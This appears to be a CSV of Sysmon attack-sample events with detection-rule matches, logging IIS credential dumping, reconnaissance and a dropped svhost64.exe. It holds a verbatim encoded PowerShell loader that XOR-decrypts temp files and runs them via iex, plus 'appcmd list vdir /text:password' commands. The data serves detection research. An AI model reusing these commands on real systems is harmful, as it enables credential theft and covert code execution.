2019-05-27T01:29:20.305063+00:00,Hacktool - EDR-Freeze Execution;Microsoft IIS Service Account Password Dumped;UAC Bypass Using NTFS Reparse Point - Process,data/EVTX-ATTACK-SAMPLES/Credential Access/discovery_sysmon_1_iis_pwd_and_config_discovery_appcmd.evtx,1,Microsoft-Windows-Sysmon,1,5985,IEWIN7,"Image: C:\Windows\System32\inetsrv\appcmd.exe
RuleName: ''
Description: Application Server Command Line Admin Tool
TerminalSessionId: 0
ParentCommandLine: '""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe""  -nop -noni -enc JABQAHIAbwBnAHIAZQBzAHMAUAByAGUAZgBlAHIAZQBuAGMAZQAgAD0AIAAiAFMAaQBsAGUAbgB0AGwAeQBDAG8AbgB0AGkAbgB1AGUAIgA7ACQAcABhAHQAaABfAGkAbgBfAG0AbwBkAHUAbABlAD0AIgBDADoAXABXAGkAbgBkAG8AdwBzAFwAVABlAG0AcABcADYAagByAHgAawAzAFwAZwBmAGcAOQBpACIAOwAkAHAAYQB0AGgAXwBpAG4AXwBhAHAAcABfAGMAbwBkAGUAPQAiAEMAOgBcAFcAaQBuAGQAbwB3AHMAXABUAGUAbQBwAFwANgBqAHIAeABrADMAXABuAGoAYQA5AHQANgA0AHIAcgBsAHUAOAAiADsAJABrAGUAeQA9AFsAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4ARQBuAGMAbwBkAGkAbgBnAF0AOgA6AFUAVABGADgALgBHAGUAdABCAHkAdABlAHMAKAAnADgAZAA5ADYAOQBlAGUAZgA2AGUAYwBhAGQAMwBjADIAOQBhADMAYQA2ADIAOQAyADgAMABlADYAOAA2AGMAZgAwAGMAMwBmADUAZAA1AGEAOAA2AGEAZgBmADMAYwBhADEAMgAwADIAMABjADkAMgAzAGEAZABjADYAYwA5ADIAJwApADsAJABlAG4AYwBfAG0AbwBkAHUAbABlAD0AWwBTAHkAcwB0AGUAbQAuAEkATwAuAEYAaQBsAGUAXQA6ADoAUgBlAGEAZABBAGwAbABCAHkAdABlAHMAKAAkAHAAYQB0AGgAXwBpAG4AXwBtAG8AZAB1AGwAZQApADsAJABlAG4AYwBfAGEAcABwAF8AYwBvAGQAZQA9AFsAUwB5AHMAdABlAG0ALgBJAE8ALgBGAGkAbABlAF0AOgA6AFIAZQBhAGQAQQBsAGwAQgB5AHQAZQBzACgAJABwAGEAdABoAF8AaQBuAF8AYQBwAHAAXwBjAG8AZABlACkAOwAkAGQAZQBjAF8AbQBvAGQAdQBsAGUAPQBOAGUAdwAtAE8AYgBqAGUAYwB0ACAAQgB5AHQAZQBbAF0AIAAkAGUAbgBjAF8AbQBvAGQAdQBsAGUALgBMAGUAbgBnAHQAaAA7ACQAZABlAGMAXwBhAHAAcABfAGMAbwBkAGUAPQBOAGUAdwAtAE8AYgBqAGUAYwB0ACAAQgB5AHQAZQBbAF0AIAAkAGUAbgBjAF8AYQBwAHAAXwBjAG8AZABlAC4ATABlAG4AZwB0AGgAOwBmAG8AcgAgACgAJABpACAAPQAgADAAOwAgACQAaQAgAC0AbAB0ACAAJABlAG4AYwBfAG0AbwBkAHUAbABlAC4ATABlAG4AZwB0AGgAOwAgACQAaQArACsAKQAgAHsAJABkAGUAYwBfAG0AbwBkAHUAbABlAFsAJABpAF0AIAA9ACAAJABlAG4AYwBfAG0AbwBkAHUAbABlAFsAJABpAF0AIAAtAGIAeABvAHIAIAAkAGsAZQB5AFsAJABpACAAJQAgACQAawBlAHkALgBMAGUAbgBnAHQAaABdADsAfQA7AGYAbwByACAAKAAkAGkAIAA9ACAAMAA7ACAAJABpACAALQBsAHQAIAAkAGUAbgBjAF8AYQBwAHAAXwBjAG8AZABlAC4ATABlAG4AZwB0AGgAOwAgACQAaQArACsAKQAgAHsAJABkAGUAYwBfAGEAcABwAF8AYwBvAGQAZQBbACQAaQBdACAAPQAgACQAZQBuAGMAXwBhAHAAcABfAGMAbwBkAGUAWwAkAGkAXQAgAC0AYgB4AG8AcgAgACQAawBlAHkAWwAkAGkAIAAlACAAJABrAGUAeQAuAEwAZQBuAGcAdABoAF0AOwB9ADsAJABkAGUAYwBfAG0AbwBkAHUAbABlAD0AWwBTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBFAG4AYwBvAGQAaQBuAGcAXQA6ADoAVQBUAEYAOAAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABkAGUAYwBfAG0AbwBkAHUAbABlACkAOwAkAGQAZQBjAF8AYQBwAHAAXwBjAG8AZABlAD0AWwBTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBFAG4AYwBvAGQAaQBuAGcAXQA6ADoAVQBUAEYAOAAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABkAGUAYwBfAGEAcABwAF8AYwBvAGQAZQApADsAJAAoACQAZABlAGMAXwBtAG8AZAB1AGwAZQArACQAZABlAGMAXwBhAHAAcABfAGMAbwBkAGUAKQB8AGkAZQB4ADsAUgBlAG0AbwB2AGUALQBJAHQAZQBtACAALQBQAGEAdABoACAAJABwAGEAdABoAF8AaQBuAF8AYQBwAHAAXwBjAG8AZABlACAALQBGAG8AcgBjAGUAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0ATgB1AGwAbAA7AA=='
Product: Internet Information Services
Company: Microsoft Corporation
ParentProcessId: 2584
LogonGuid: 365ABB72-B26B-5CEA-0000-002023240800
Hashes: SHA1=C5423FEF0E8E211BB8BAB9C11E730048BBED7B29,MD5=0E5BC786206A3762CE47A0A2DBD01D7B,SHA256=113F68086A3F02276395CB70C72B00ED33A47FD00820D229093CD6ADDC2F73F4,IMPHASH=1697BBEAB0AC62DD7B8016CE25425F45
ParentProcessGuid: 365ABB72-3D4A-5CEB-0000-0010FA93FD00
ProcessId: 2640
CurrentDirectory: C:\Windows\Temp\
ProcessGuid: 365ABB72-3D70-5CEB-0000-001072E6FF00
CommandLine: '""C:\Windows\System32\inetsrv\appcmd.exe""  list vdir /text:password'
FileVersion: 7.5.7600.16385 (win7_rtm.090713-1255)
User: IIS APPPOOL\DefaultAppPool
LogonId: '0x82423'
IntegrityLevel: High
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
UtcTime: 2019-05-27 01:29:20.265
"
2019-05-27T01:29:20.435250+00:00,Hacktool - EDR-Freeze Execution;UAC Bypass Using NTFS Reparse Point - Process,data/EVTX-ATTACK-SAMPLES/Credential Access/discovery_sysmon_1_iis_pwd_and_config_discovery_appcmd.evtx,1,Microsoft-Windows-Sysmon,1,5988,IEWIN7,"Image: C:\Windows\System32\inetsrv\appcmd.exe
RuleName: ''
Description: Application Server Command Line Admin Tool
TerminalSessionId: 0
ParentCommandLine: '""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe""  -nop -noni -enc JABQAHIAbwBnAHIAZQBzAHMAUAByAGUAZgBlAHIAZQBuAGMAZQAgAD0AIAAiAFMAaQBsAGUAbgB0AGwAeQBDAG8AbgB0AGkAbgB1AGUAIgA7ACQAcABhAHQAaABfAGkAbgBfAG0AbwBkAHUAbABlAD0AIgBDADoAXABXAGkAbgBkAG8AdwBzAFwAVABlAG0AcABcADYAagByAHgAawAzAFwAZwBmAGcAOQBpACIAOwAkAHAAYQB0AGgAXwBpAG4AXwBhAHAAcABfAGMAbwBkAGUAPQAiAEMAOgBcAFcAaQBuAGQAbwB3AHMAXABUAGUAbQBwAFwANgBqAHIAeABrADMAXABuAGoAYQA5AHQANgA0AHIAcgBsAHUAOAAiADsAJABrAGUAeQA9AFsAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4ARQBuAGMAbwBkAGkAbgBnAF0AOgA6AFUAVABGADgALgBHAGUAdABCAHkAdABlAHMAKAAnADgAZAA5ADYAOQBlAGUAZgA2AGUAYwBhAGQAMwBjADIAOQBhADMAYQA2ADIAOQAyADgAMABlADYAOAA2AGMAZgAwAGMAMwBmADUAZAA1AGEAOAA2AGEAZgBmADMAYwBhADEAMgAwADIAMABjADkAMgAzAGEAZABjADYAYwA5ADIAJwApADsAJABlAG4AYwBfAG0AbwBkAHUAbABlAD0AWwBTAHkAcwB0AGUAbQAuAEkATwAuAEYAaQBsAGUAXQA6ADoAUgBlAGEAZABBAGwAbABCAHkAdABlAHMAKAAkAHAAYQB0AGgAXwBpAG4AXwBtAG8AZAB1AGwAZQApADsAJABlAG4AYwBfAGEAcABwAF8AYwBvAGQAZQA9AFsAUwB5AHMAdABlAG0ALgBJAE8ALgBGAGkAbABlAF0AOgA6AFIAZQBhAGQAQQBsAGwAQgB5AHQAZQBzACgAJABwAGEAdABoAF8AaQBuAF8AYQBwAHAAXwBjAG8AZABlACkAOwAkAGQAZQBjAF8AbQBvAGQAdQBsAGUAPQBOAGUAdwAtAE8AYgBqAGUAYwB0ACAAQgB5AHQAZQBbAF0AIAAkAGUAbgBjAF8AbQBvAGQAdQBsAGUALgBMAGUAbgBnAHQAaAA7ACQAZABlAGMAXwBhAHAAcABfAGMAbwBkAGUAPQBOAGUAdwAtAE8AYgBqAGUAYwB0ACAAQgB5AHQAZQBbAF0AIAAkAGUAbgBjAF8AYQBwAHAAXwBjAG8AZABlAC4ATABlAG4AZwB0AGgAOwBmAG8AcgAgACgAJABpACAAPQAgADAAOwAgACQAaQAgAC0AbAB0ACAAJABlAG4AYwBfAG0AbwBkAHUAbABlAC4ATABlAG4AZwB0AGgAOwAgACQAaQArACsAKQAgAHsAJABkAGUAYwBfAG0AbwBkAHUAbABlAFsAJABpAF0AIAA9ACAAJABlAG4AYwBfAG0AbwBkAHUAbABlAFsAJABpAF0AIAAtAGIAeABvAHIAIAAkAGsAZQB5AFsAJABpACAAJQAgACQAawBlAHkALgBMAGUAbgBnAHQAaABdADsAfQA7AGYAbwByACAAKAAkAGkAIAA9ACAAMAA7ACAAJABpACAALQBsAHQAIAAkAGUAbgBjAF8AYQBwAHAAXwBjAG8AZABlAC4ATABlAG4AZwB0AGgAOwAgACQAaQArACsAKQAgAHsAJABkAGUAYwBfAGEAcABwAF8AYwBvAGQAZQBbACQAaQBdACAAPQAgACQAZQBuAGMAXwBhAHAAcABfAGMAbwBkAGUAWwAkAGkAXQAgAC0AYgB4AG8AcgAgACQAawBlAHkAWwAkAGkAIAAlACAAJABrAGUAeQAuAEwAZQBuAGcAdABoAF0AOwB9ADsAJABkAGUAYwBfAG0AbwBkAHUAbABlAD0AWwBTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBFAG4AYwBvAGQAaQBuAGcAXQA6ADoAVQBUAEYAOAAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABkAGUAYwBfAG0AbwBkAHUAbABlACkAOwAkAGQAZQBjAF8AYQBwAHAAXwBjAG8AZABlAD0AWwBTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBFAG4AYwBvAGQAaQBuAGcAXQA6ADoAVQBUAEYAOAAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABkAGUAYwBfAGEAcABwAF8AYwBvAGQAZQApADsAJAAoACQAZABlAGMAXwBtAG8AZAB1AGwAZQArACQAZABlAGMAXwBhAHAAcABfAGMAbwBkAGUAKQB8AGkAZQB4ADsAUgBlAG0AbwB2AGUALQBJAHQAZQBtACAALQBQAGEAdABoACAAJABwAGEAdABoAF8AaQBuAF8AYQBwAHAAXwBjAG8AZABlACAALQBGAG8AcgBjAGUAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0ATgB1AGwAbAA7AA=='
Product: Internet Information Services
Company: Microsoft Corporation
ParentProcessId: 2584
LogonGuid: 365ABB72-B26B-5CEA-0000-002023240800
Hashes: SHA1=C5423FEF0E8E211BB8BAB9C11E730048BBED7B29,MD5=0E5BC786206A3762CE47A0A2DBD01D7B,SHA256=113F68086A3F02276395CB70C72B00ED33A47FD00820D229093CD6ADDC2F73F4,IMPHASH=1697BBEAB0AC62DD7B8016CE25425F45
ParentProcessGuid: 365ABB72-3D4A-5CEB-0000-0010FA93FD00
ProcessId: 1004
CurrentDirectory: C:\Windows\Temp\
ProcessGuid: 365ABB72-3D70-5CEB-0000-001032EAFF00
CommandLine: '""C:\Windows\System32\inetsrv\appcmd.exe""  list vdir "". )"" /text:userName'
FileVersion: 7.5.7600.16385 (win7_rtm.090713-1255)
User: IIS APPPOOL\DefaultAppPool
LogonId: '0x82423'
IntegrityLevel: High
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
UtcTime: 2019-05-27 01:29:20.375
"
2019-05-27T01:29:20.555423+00:00,Hacktool - EDR-Freeze Execution;Microsoft IIS Service Account Password Dumped;UAC Bypass Using NTFS Reparse Point - Process,data/EVTX-ATTACK-SAMPLES/Credential Access/discovery_sysmon_1_iis_pwd_and_config_discovery_appcmd.evtx,1,Microsoft-Windows-Sysmon,1,5991,IEWIN7,"Image: C:\Windows\System32\inetsrv\appcmd.exe
RuleName: ''
Description: Application Server Command Line Admin Tool
TerminalSessionId: 0
ParentCommandLine: '""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe""  -nop -noni -enc JABQAHIAbwBnAHIAZQBzAHMAUAByAGUAZgBlAHIAZQBuAGMAZQAgAD0AIAAiAFMAaQBsAGUAbgB0AGwAeQBDAG8AbgB0AGkAbgB1AGUAIgA7ACQAcABhAHQAaABfAGkAbgBfAG0AbwBkAHUAbABlAD0AIgBDADoAXABXAGkAbgBkAG8AdwBzAFwAVABlAG0AcABcADYAagByAHgAawAzAFwAZwBmAGcAOQBpACIAOwAkAHAAYQB0AGgAXwBpAG4AXwBhAHAAcABfAGMAbwBkAGUAPQAiAEMAOgBcAFcAaQBuAGQAbwB3AHMAXABUAGUAbQBwAFwANgBqAHIAeABrADMAXABuAGoAYQA5AHQANgA0AHIAcgBsAHUAOAAiADsAJABrAGUAeQA9AFsAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4ARQBuAGMAbwBkAGkAbgBnAF0AOgA6AFUAVABGADgALgBHAGUAdABCAHkAdABlAHMAKAAnADgAZAA5ADYAOQBlAGUAZgA2AGUAYwBhAGQAMwBjADIAOQBhADMAYQA2ADIAOQAyADgAMABlADYAOAA2AGMAZgAwAGMAMwBmADUAZAA1AGEAOAA2AGEAZgBmADMAYwBhADEAMgAwADIAMABjADkAMgAzAGEAZABjADYAYwA5ADIAJwApADsAJABlAG4AYwBfAG0AbwBkAHUAbABlAD0AWwBTAHkAcwB0AGUAbQAuAEkATwAuAEYAaQBsAGUAXQA6ADoAUgBlAGEAZABBAGwAbABCAHkAdABlAHMAKAAkAHAAYQB0AGgAXwBpAG4AXwBtAG8AZAB1AGwAZQApADsAJABlAG4AYwBfAGEAcABwAF8AYwBvAGQAZQA9AFsAUwB5AHMAdABlAG0ALgBJAE8ALgBGAGkAbABlAF0AOgA6AFIAZQBhAGQAQQBsAGwAQgB5AHQAZQBzACgAJABwAGEAdABoAF8AaQBuAF8AYQBwAHAAXwBjAG8AZABlACkAOwAkAGQAZQBjAF8AbQBvAGQAdQBsAGUAPQBOAGUAdwAtAE8AYgBqAGUAYwB0ACAAQgB5AHQAZQBbAF0AIAAkAGUAbgBjAF8AbQBvAGQAdQBsAGUALgBMAGUAbgBnAHQAaAA7ACQAZABlAGMAXwBhAHAAcABfAGMAbwBkAGUAPQBOAGUAdwAtAE8AYgBqAGUAYwB0ACAAQgB5AHQAZQBbAF0AIAAkAGUAbgBjAF8AYQBwAHAAXwBjAG8AZABlAC4ATABlAG4AZwB0AGgAOwBmAG8AcgAgACgAJABpACAAPQAgADAAOwAgACQAaQAgAC0AbAB0ACAAJABlAG4AYwBfAG0AbwBkAHUAbABlAC4ATABlAG4AZwB0AGgAOwAgACQAaQArACsAKQAgAHsAJABkAGUAYwBfAG0AbwBkAHUAbABlAFsAJABpAF0AIAA9ACAAJABlAG4AYwBfAG0AbwBkAHUAbABlAFsAJABpAF0AIAAtAGIAeABvAHIAIAAkAGsAZQB5AFsAJABpACAAJQAgACQAawBlAHkALgBMAGUAbgBnAHQAaABdADsAfQA7AGYAbwByACAAKAAkAGkAIAA9ACAAMAA7ACAAJABpACAALQBsAHQAIAAkAGUAbgBjAF8AYQBwAHAAXwBjAG8AZABlAC4ATABlAG4AZwB0AGgAOwAgACQAaQArACsAKQAgAHsAJABkAGUAYwBfAGEAcABwAF8AYwBvAGQAZQBbACQAaQBdACAAPQAgACQAZQBuAGMAXwBhAHAAcABfAGMAbwBkAGUAWwAkAGkAXQAgAC0AYgB4AG8AcgAgACQAawBlAHkAWwAkAGkAIAAlACAAJABrAGUAeQAuAEwAZQBuAGcAdABoAF0AOwB9ADsAJABkAGUAYwBfAG0AbwBkAHUAbABlAD0AWwBTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBFAG4AYwBvAGQAaQBuAGcAXQA6ADoAVQBUAEYAOAAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABkAGUAYwBfAG0AbwBkAHUAbABlACkAOwAkAGQAZQBjAF8AYQBwAHAAXwBjAG8AZABlAD0AWwBTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBFAG4AYwBvAGQAaQBuAGcAXQA6ADoAVQBUAEYAOAAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABkAGUAYwBfAGEAcABwAF8AYwBvAGQAZQApADsAJAAoACQAZABlAGMAXwBtAG8AZAB1AGwAZQArACQAZABlAGMAXwBhAHAAcABfAGMAbwBkAGUAKQB8AGkAZQB4ADsAUgBlAG0AbwB2AGUALQBJAHQAZQBtACAALQBQAGEAdABoACAAJABwAGEAdABoAF8AaQBuAF8AYQBwAHAAXwBjAG8AZABlACAALQBGAG8AcgBjAGUAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0ATgB1AGwAbAA7AA=='
Product: Internet Information Services
Company: Microsoft Corporation
ParentProcessId: 2584
LogonGuid: 365ABB72-B26B-5CEA-0000-002023240800
Hashes: SHA1=C5423FEF0E8E211BB8BAB9C11E730048BBED7B29,MD5=0E5BC786206A3762CE47A0A2DBD01D7B,SHA256=113F68086A3F02276395CB70C72B00ED33A47FD00820D229093CD6ADDC2F73F4,IMPHASH=1697BBEAB0AC62DD7B8016CE25425F45
ParentProcessGuid: 365ABB72-3D4A-5CEB-0000-0010FA93FD00
ProcessId: 4012
CurrentDirectory: C:\Windows\Temp\
ProcessGuid: 365ABB72-3D70-5CEB-0000-0010F2EDFF00
CommandLine: '""C:\Windows\System32\inetsrv\appcmd.exe""  list vdir "". )"" /text:password'
FileVersion: 7.5.7600.16385 (win7_rtm.090713-1255)
User: IIS APPPOOL\DefaultAppPool
LogonId: '0x82423'
IntegrityLevel: High
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
UtcTime: 2019-05-27 01:29:20.475
"
2019-05-27T15:12:38.241298+00:00,HackTool - CrackMapExec Process Patterns;Hacktool - EDR-Freeze Execution;Operator Bloopers Cobalt Strike Commands;Suspicious Process Parents;UAC Bypass Using NTFS Reparse Point - Process,data/EVTX-ATTACK-SAMPLES/Execution/sysmon_exec_from_vss_persistence.evtx,1,Microsoft-Windows-Sysmon,1,6168,IEWIN7,"Image: C:\Windows\System32\cmd.exe
RuleName: ''
Description: Windows Command Processor
TerminalSessionId: 0
ParentCommandLine: '""C:\Windows\System32\notepad.exe""'
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
ParentProcessId: 1944
LogonGuid: 365ABB72-7B40-5CEC-0000-0020E7030000
Hashes: SHA1=EE8CBF12D87C4D388F09B4F69BED2E91682920B5,MD5=AD7B9C14083B52BC532FBA5948342B98,SHA256=17F746D82695FA9B35493B41859D39D786D32B23A9D2E00F4011DEC7A02402AE,IMPHASH=CEEFB55F764020CC5C5F8F23349AB163
ParentProcessGuid: 365ABB72-FD85-5CEB-0000-00104C0E0B00
ProcessId: 3256
CurrentDirectory: C:\Windows\system32\
ProcessGuid: 365ABB72-FE66-5CEB-0000-001058F50B00
CommandLine: 'cmd.exe /c whoami /groups '
FileVersion: 6.1.7601.17514 (win7sp1_rtm.101119-1850)
User: NT AUTHORITY\SYSTEM
LogonId: '0x3e7'
IntegrityLevel: System
ParentImage: C:\Windows\System32\notepad.exe
UtcTime: 2019-05-27 15:12:38.231
"
2019-05-27T15:12:38.290374+00:00,Group Membership Reconnaissance Via Whoami.EXE;HackTool - CrackMapExec Process Patterns;Hacktool - EDR-Freeze Execution;Local Accounts Discovery;UAC Bypass Using NTFS Reparse Point - Process;Whoami.EXE Execution From Privileged Process,data/EVTX-ATTACK-SAMPLES/Execution/sysmon_exec_from_vss_persistence.evtx,1,Microsoft-Windows-Sysmon,1,6170,IEWIN7,"Image: C:\Windows\System32\whoami.exe
RuleName: ''
Description: whoami - displays logged on user information
TerminalSessionId: 0
ParentCommandLine: 'cmd.exe /c whoami /groups '
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
ParentProcessId: 3256
LogonGuid: 365ABB72-7B40-5CEC-0000-0020E7030000
Hashes: SHA1=DC058F52AD8ACBD316827B6DCAC2434AB3CC515C,MD5=0EBF71E33EF09CA65D9683AFA999C473,SHA256=599EFD455AEEEFE2044A9B597061F271595033F5D0DF2C99DFDBCA8394BBCEC3,IMPHASH=C5352B949915AB8CD5E1844790D19274
ParentProcessGuid: 365ABB72-FE66-5CEB-0000-001058F50B00
ProcessId: 1168
CurrentDirectory: C:\Windows\system32\
ProcessGuid: 365ABB72-FE66-5CEB-0000-0010C7F80B00
CommandLine: 'whoami  /groups '
FileVersion: 6.1.7600.16385 (win7_rtm.090713-1255)
User: NT AUTHORITY\SYSTEM
LogonId: '0x3e7'
IntegrityLevel: System
ParentImage: C:\Windows\System32\cmd.exe
UtcTime: 2019-05-27 15:12:38.270
"
2019-05-27T15:12:43.990983+00:00,HackTool - CrackMapExec Process Patterns;Hacktool - EDR-Freeze Execution;Operator Bloopers Cobalt Strike Commands;Suspicious Process Parents;UAC Bypass Using NTFS Reparse Point - Process,data/EVTX-ATTACK-SAMPLES/Execution/sysmon_exec_from_vss_persistence.evtx,1,Microsoft-Windows-Sysmon,1,6171,IEWIN7,"Image: C:\Windows\System32\cmd.exe
RuleName: ''
Description: Windows Command Processor
TerminalSessionId: 0
ParentCommandLine: '""C:\Windows\System32\notepad.exe""'
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
ParentProcessId: 1944
LogonGuid: 365ABB72-7B40-5CEC-0000-0020E7030000
Hashes: SHA1=EE8CBF12D87C4D388F09B4F69BED2E91682920B5,MD5=AD7B9C14083B52BC532FBA5948342B98,SHA256=17F746D82695FA9B35493B41859D39D786D32B23A9D2E00F4011DEC7A02402AE,IMPHASH=CEEFB55F764020CC5C5F8F23349AB163
ParentProcessGuid: 365ABB72-FD85-5CEB-0000-00104C0E0B00
ProcessId: 1536
CurrentDirectory: C:\Windows\system32\
ProcessGuid: 365ABB72-FE6B-5CEB-0000-00102A090C00
CommandLine: cmd.exe /c %%SYSTEMROOT%%\system32\wbem\wmic.exe /output:C:\Windows\TEMP\htxjGDrk /INTERACTIVE:off /node:localhost Service where(name=""VSS"") get state
FileVersion: 6.1.7601.17514 (win7sp1_rtm.101119-1850)
User: NT AUTHORITY\SYSTEM
LogonId: '0x3e7'
IntegrityLevel: System
ParentImage: C:\Windows\System32\notepad.exe
UtcTime: 2019-05-27 15:12:43.969
"
2019-05-27T15:12:44.055762+00:00,HackTool - CrackMapExec Process Patterns;Hacktool - EDR-Freeze Execution;Service Reconnaissance Via Wmic.EXE;UAC Bypass Using NTFS Reparse Point - Process,data/EVTX-ATTACK-SAMPLES/Execution/sysmon_exec_from_vss_persistence.evtx,1,Microsoft-Windows-Sysmon,1,6173,IEWIN7,"Image: C:\Windows\System32\wbem\WMIC.exe
RuleName: ''
Description: WMI Commandline Utility
TerminalSessionId: 0
ParentCommandLine: cmd.exe /c %SYSTEMROOT%\system32\wbem\wmic.exe /output:C:\Windows\TEMP\htxjGDrk /INTERACTIVE:off /node:localhost Service where(name=""VSS"") get state
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
ParentProcessId: 1536
LogonGuid: 365ABB72-7B40-5CEC-0000-0020E7030000
Hashes: SHA1=4368DBD172224EC9461364BE1AC9DFFC5D9224A8,MD5=A03CF3838775E0801A0894C8BACD2E56,SHA256=132AA270790F56A7524CAB968927ED5E1D91B9A26D4BADCB24E450E7DECC5F81,IMPHASH=B59AF26B08AA14BA66272388BC9C2443
ParentProcessGuid: 365ABB72-FE6B-5CEB-0000-00102A090C00
ProcessId: 3520
CurrentDirectory: C:\Windows\system32\
ProcessGuid: 365ABB72-FE6C-5CEB-0000-0010050C0C00
CommandLine: C:\Windows\system32\wbem\wmic.exe  /output:C:\Windows\TEMP\htxjGDrk /INTERACTIVE:off /node:localhost Service where(name=""VSS"") get state
FileVersion: 6.1.7600.16385 (win7_rtm.090713-1255)
User: NT AUTHORITY\SYSTEM
LogonId: '0x3e7'
IntegrityLevel: System
ParentImage: C:\Windows\System32\cmd.exe
UtcTime: 2019-05-27 15:12:44.023
"
2019-05-27T15:12:45.405337+00:00,HackTool - CrackMapExec Process Patterns;Hacktool - EDR-Freeze Execution;Operator Bloopers Cobalt Strike Commands;Suspicious Process Parents;UAC Bypass Using NTFS Reparse Point - Process,data/EVTX-ATTACK-SAMPLES/Execution/sysmon_exec_from_vss_persistence.evtx,1,Microsoft-Windows-Sysmon,1,6175,IEWIN7,"Image: C:\Windows\System32\cmd.exe
RuleName: ''
Description: Windows Command Processor
TerminalSessionId: 0
ParentCommandLine: '""C:\Windows\System32\notepad.exe""'
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
ParentProcessId: 1944
LogonGuid: 365ABB72-7B40-5CEC-0000-0020E7030000
Hashes: SHA1=EE8CBF12D87C4D388F09B4F69BED2E91682920B5,MD5=AD7B9C14083B52BC532FBA5948342B98,SHA256=17F746D82695FA9B35493B41859D39D786D32B23A9D2E00F4011DEC7A02402AE,IMPHASH=CEEFB55F764020CC5C5F8F23349AB163
ParentProcessGuid: 365ABB72-FD85-5CEB-0000-00104C0E0B00
ProcessId: 3876
CurrentDirectory: C:\Windows\system32\
ProcessGuid: 365ABB72-FE6D-5CEB-0000-0010332A0C00
CommandLine: cmd.exe /c %%SYSTEMROOT%%\system32\wbem\wmic.exe /output:C:\Windows\TEMP\CEafXbEl /INTERACTIVE:off /node:localhost Service where(name=""swprv"") get state
FileVersion: 6.1.7601.17514 (win7sp1_rtm.101119-1850)
User: NT AUTHORITY\SYSTEM
LogonId: '0x3e7'
IntegrityLevel: System
ParentImage: C:\Windows\System32\notepad.exe
UtcTime: 2019-05-27 15:12:45.383
"
2019-05-27T15:12:45.491710+00:00,HackTool - CrackMapExec Process Patterns;Hacktool - EDR-Freeze Execution;Service Reconnaissance Via Wmic.EXE;UAC Bypass Using NTFS Reparse Point - Process,data/EVTX-ATTACK-SAMPLES/Execution/sysmon_exec_from_vss_persistence.evtx,1,Microsoft-Windows-Sysmon,1,6177,IEWIN7,"Image: C:\Windows\System32\wbem\WMIC.exe
RuleName: ''
Description: WMI Commandline Utility
TerminalSessionId: 0
ParentCommandLine: cmd.exe /c %SYSTEMROOT%\system32\wbem\wmic.exe /output:C:\Windows\TEMP\CEafXbEl /INTERACTIVE:off /node:localhost Service where(name=""swprv"") get state
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
ParentProcessId: 3876
LogonGuid: 365ABB72-7B40-5CEC-0000-0020E7030000
Hashes: SHA1=4368DBD172224EC9461364BE1AC9DFFC5D9224A8,MD5=A03CF3838775E0801A0894C8BACD2E56,SHA256=132AA270790F56A7524CAB968927ED5E1D91B9A26D4BADCB24E450E7DECC5F81,IMPHASH=B59AF26B08AA14BA66272388BC9C2443
ParentProcessGuid: 365ABB72-FE6D-5CEB-0000-0010332A0C00
ProcessId: 1636
CurrentDirectory: C:\Windows\system32\
ProcessGuid: 365ABB72-FE6D-5CEB-0000-0010122D0C00
CommandLine: C:\Windows\system32\wbem\wmic.exe  /output:C:\Windows\TEMP\CEafXbEl /INTERACTIVE:off /node:localhost Service where(name=""swprv"") get state
FileVersion: 6.1.7600.16385 (win7_rtm.090713-1255)
User: NT AUTHORITY\SYSTEM
LogonId: '0x3e7'
IntegrityLevel: System
ParentImage: C:\Windows\System32\cmd.exe
UtcTime: 2019-05-27 15:12:45.437
"
2019-05-27T15:12:46.981641+00:00,Suspicious Double Extension Files,data/EVTX-ATTACK-SAMPLES/Execution/sysmon_exec_from_vss_persistence.evtx,1,Microsoft-Windows-Sysmon,11,6179,IEWIN7,"ProcessGuid: 365ABB72-FD85-5CEB-0000-00104C0E0B00
CreationUtcTime: 2019-05-27 15:12:46.981
UtcTime: 2019-05-27 15:12:46.981
ProcessId: 1944
RuleName: ''
TargetFilename: C:\Windows\Temp\svhost64.exe
Image: C:\Windows\System32\notepad.exe
"
2019-05-27T15:12:47.402708+00:00,HackTool - CrackMapExec Process Patterns;Hacktool - EDR-Freeze Execution;Operator Bloopers Cobalt Strike Commands;Suspicious Process Parents;UAC Bypass Using NTFS Reparse Point - Process,data/EVTX-ATTACK-SAMPLES/Execution/sysmon_exec_from_vss_persistence.evtx,1,Microsoft-Windows-Sysmon,1,6180,IEWIN7,"Image: C:\Windows\System32\cmd.exe
RuleName: ''
Description: Windows Command Processor
TerminalSessionId: 0
ParentCommandLine: '""C:\Windows\System32\notepad.exe""'
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
ParentProcessId: 1944
LogonGuid: 365ABB72-7B40-5CEC-0000-0020E7030000
Hashes: SHA1=EE8CBF12D87C4D388F09B4F69BED2E91682920B5,MD5=AD7B9C14083B52BC532FBA5948342B98,SHA256=17F746D82695FA9B35493B41859D39D786D32B23A9D2E00F4011DEC7A02402AE,IMPHASH=CEEFB55F764020CC5C5F8F23349AB163
